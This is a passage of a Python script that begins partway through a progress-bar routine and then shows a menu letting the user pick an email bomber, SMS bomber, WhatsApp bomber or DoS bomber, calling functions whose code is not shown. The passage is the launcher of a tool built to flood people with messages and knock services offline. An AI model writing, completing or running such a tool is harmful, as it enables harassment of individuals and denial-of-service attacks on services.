	sys.stdout.write("\b" * (toolbar_width+1)) # return to start of line, after '['

	for i in range(toolbar_width):
	    time.sleep(0.1) # do real work here
	    # update the bar
	    sys.stdout.write("█")
	    sys.stdout.flush()

	sys.stdout.write("]\n") # this ends the progress bar

print("Initializing program...\n")

pb()

print('''
	╭━━━━━━━━━━━━━━━━━━━━━━━╮
	┃Choose a bomber:       ┃
	┃1-Email bomber         ┃
	┃2-Sms bomber           ┃
	┃3-WhatsApp bomber      ┃
	┃4-Dos bomber           ┃          
	╰━━━━━━━━━━━━━━━━━━━━━━━╯
	''')
ans=int(input(">> "))

if ans==1:
	emailbomber()
elif ans==2:
	smsbomber()
elif ans==3:
	wbomber()
elif ans==4:
	doser()
else:
	print("ERROR: Invalid value")
	input()